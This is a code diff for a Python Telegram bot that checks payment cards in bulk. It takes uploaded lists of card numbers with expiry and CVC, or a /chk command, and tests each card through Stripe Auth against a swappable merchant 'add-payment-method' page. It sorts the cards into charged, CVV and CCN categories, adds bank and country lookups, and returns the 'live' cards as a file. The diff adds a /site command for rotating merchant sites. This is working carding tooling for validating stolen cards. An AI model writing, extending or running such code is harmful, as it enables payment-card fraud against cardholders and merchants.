@@ -1,16 +1,36 @@
 import asyncio
 import tempfile
 import os
-import requests
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
-from config import TELEGRAM_BOT_TOKEN, MAX_WORKERS
-from auth_processor import generate_uuids, prepare_headers, process_single_card
+import re
 
-# BIN lookup function
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
+from telegram.ext import (
+    Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
+)
+
+from config import TELEGRAM_BOT_TOKEN, MAX_WORKERS, DEFAULT_API_URL
+from auth_processor import (
+    generate_uuids, prepare_headers,
+    process_single_card_for_site, send_telegram_message
+)
+
+SITE_STORAGE_FILE = "current_site.txt"
+
+
+def save_current_site(url: str):
+    with open(SITE_STORAGE_FILE, "w") as f:
+        f.write(url.strip())
+
+def load_current_site():
+    try:
+        with open(SITE_STORAGE_FILE, "r") as f:
+            return f.read().strip()
+    except FileNotFoundError:
+        return DEFAULT_API_URL
+
 def bin_lookup(card_number: str):
     bin_number = card_number[:6]
-    headers = {"Accept-Version": "3", "User -Agent": "Mozilla/5.0"}
+    headers = {"Accept-Version": "3", "User-Agent": "Mozilla/5.0"}
     try:
         r = requests.get(f"https://lookup.binlist.net/{bin_number}", headers=headers, timeout=5)
         if r.status_code == 200:
@@ -26,7 +46,7 @@ def bin_lookup(card_number: str):
     except Exception:
         return f"{bin_number} - ERROR", "Unknown Bank", "Unknown Country"
 
-# Build inline keyboard for status display
+
 def build_status_keyboard(card, total, processed, status, charged, cvv, ccn, low, declined):
     keyboard = [
         [InlineKeyboardButton(f"• {card} •", callback_data="noop")],
@@ -41,7 +61,7 @@ def build_status_keyboard(card, total, processed, status, charged, cvv, ccn, low
     ]
     return InlineKeyboardMarkup(keyboard)
 
-# /start command handler
+
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         "Send me a .txt file with one card per line in the format:\n"
@@ -51,39 +71,111 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode="Markdown"
     )
 
-# Handle uploaded .txt file
+
+async def site(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    keyboard = [[InlineKeyboardButton("Replace Site", callback_data="replace_site")]]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    await update.message.reply_text("You want to replace the site?", reply_markup=reply_markup)
+
+
+async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+
+    if query.data == "replace_site":
+        await query.message.reply_text(
+            "Please send the site information in this format exactly:\n"
+            "SITE: https://www.example.com/my-account/add-payment-method/\n"
+            "PAYMENT METHODS: [stripe]\n"
+            "RESPONSE: Your Card Was Decline\n"
+            "STATUS: The site can be used for API and in no-code checker.✅"
+        )
+        context.user_data["awaiting_site"] = True
+
+
+async def capture_site_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if context.user_data.get("awaiting_site"):
+        text = update.message.text
+        match = re.search(r"SITE:\s*(https?://\S+)", text)
+        if match:
+            site_url = match.group(1)
+            save_current_site(site_url)
+            context.user_data["awaiting_site"] = False
+            await update.message.reply_text(f"Site URL replaced with:\n{site_url}")
+        else:
+            await update.message.reply_text("URL not found or format incorrect. Please send again.")
+
+
+async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    args = context.args
+    if len(args) < 3:
+        await update.message.reply_text(
+            "Usage: /chk <card_number> <month|year> <cvc>\nExample: /chk 4242424242424242 12|25 123"
+        )
+        return
+
+    card_number = args[0]
+    exp = args[1]
+    cvc = args[2]
+
+    if '|' not in exp:
+        await update.message.reply_text("Expiry must be in MM|YY format.")
+        return
+
+    card_data = f"{card_number}|{exp}|{cvc}"
+    site_url = load_current_site()
+
+    headers = prepare_headers()
+    uuids = generate_uuids()
+    chat_id = update.message.chat_id
+    bot_token = TELEGRAM_BOT_TOKEN
+
+    loop = asyncio.get_running_loop()
+    status, msg, raw = await loop.run_in_executor(
+        None,
+        process_single_card_for_site,
+        card_data,
+        headers,
+        uuids,
+        chat_id,
+        bot_token,
+        site_url
+    )
+
+    await update.message.reply_text(f"Result: {status}\nMessage: {msg}")
+
+
 async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     doc = update.message.document
     if not doc or not doc.file_name.endswith(".txt"):
         await update.message.reply_text("❌ Please upload a .txt file with card data.")
         return
 
-    # Download file
     file = await doc.get_file()
     local_path = os.path.join(tempfile.gettempdir(), doc.file_name)
     await file.download_to_drive(local_path)
 
-    # Read lines and clean
     with open(local_path, "r") as f:
-        lines = [line.strip() for line in f if line.strip()]
+        lines = [line.strip() for line in f if line.strip() and len(line.split("|")) == 4]
 
     total = len(lines)
     if total == 0:
-        await update.message.reply_text("❌ The file is empty.")
+        await update.message.reply_text("❌ The file is empty or invalid format.")
         return
 
-    # Initial message
     preparing_msg = await update.message.reply_text("Preparing file ⚙️...")
     await asyncio.sleep(2)
     await preparing_msg.delete()
 
-    # Counters
     charged_count = cvv_count = ccn_count = low_funds_count = declined_count = 0
     collected_cards = []
 
     reply_msg = await update.message.reply_text(
         f"Processing 0/{total}...",
-        reply_markup=build_status_keyboard("Waiting for first card", total, 0, "Idle", charged_count, cvv_count, ccn_count, low_funds_count, declined_count)
+        reply_markup=build_status_keyboard(
+            "Waiting for first card", total, 0, "Idle",
+            charged_count, cvv_count, ccn_count, low_funds_count, declined_count
+        )
     )
 
     uuids = generate_uuids()
@@ -92,17 +184,16 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     bot_token = TELEGRAM_BOT_TOKEN
 
     loop = asyncio.get_running_loop()
-
-    # Run card processing concurrently in thread pool
     tasks = [
         loop.run_in_executor(
             None,
-            process_single_card,
+            process_single_card_for_site,
             card,
             headers,
             uuids,
             chat_id,
-            bot_token
+            bot_token,
+            load_current_site()
         )
         for card in lines
     ]
@@ -112,7 +203,6 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         status_category, telegram_message, raw_card = await future
         processed_count += 1
 
-        # Update counters
         if status_category == "CHARGED":
             charged_count += 1
             status_text = "Charged"
@@ -131,52 +221,57 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
             declined_count += 1
             status_text = "Declined"
 
-        # Send detailed message for each card
         try:
             bin_info, bank, country = bin_lookup(raw_card.split('|')[0])
         except Exception:
             bin_info, bank, country = "N/A", "N/A", "N/A"
 
         msg = (
-            f"<b>CARD:</b> <code>{raw_card}</code>\n"
-            f"<b>Gateway:</b> Stripe Auth\n"
-            f"<b>Response:</b> {status_text} {'✅' if status_category in ['CHARGED', 'CVV', 'LOW_FUNDS'] else '❌'}\n\n"
-            f"<b>Bin Info:</b> {bin_info}\n"
-            f"<b>Bank:</b> {bank}\n"
-            f"<b>Country:</b> {country}"
+            f"CARD: {raw_card}\n"
+            f"Gateway: Stripe Auth\n"
+            f"Response: {status_text} {'✅' if status_category in ['CHARGED', 'CVV', 'LOW_FUNDS'] else '❌'}\n\n"
+            f"Bin Info: {bin_info}\n"
+            f"Bank: {bank}\n"
+            f"Country: {country}"
         )
         await update.message.reply_text(msg, parse_mode="HTML")
 
-        # Update status keyboard
         try:
             await reply_msg.edit_text(
                 f"Processing {processed_count}/{total}...",
-                reply_markup=build_status_keyboard(raw_card, total, processed_count, status_text, charged_count, cvv_count, ccn_count, low_funds_count, declined_count)
+                reply_markup=build_status_keyboard(
+                    raw_card, total, processed_count, status_text,
+                    charged_count, cvv_count, ccn_count, low_funds_count, declined_count
+                )
             )
         except Exception:
-            # Ignore edit errors (e.g., message deleted or flood limits)
             pass
 
     await update.message.reply_text("✅ Finished processing all cards.")
 
-    # Save CVV + CCN cards to file and send
     if collected_cards:
         result_file = os.path.join(tempfile.gettempdir(), "results.txt")
         with open(result_file, "w") as f:
             f.write("\n".join(collected_cards))
-
         await update.message.reply_document(
             InputFile(result_file, filename="results.txt"),
             caption="📂 Collected CVV + CCN cards"
         )
 
+
 def main():
     app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
+
     app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("site", site))
+    app.add_handler(CallbackQueryHandler(button_handler))
+    app.add_handler(CommandHandler("chk", chk))
+    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), capture_site_message))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
 
     print("🤖 Bot is running...")
     app.run_polling()
+
 
 if __name__ == "__main__":
     main()
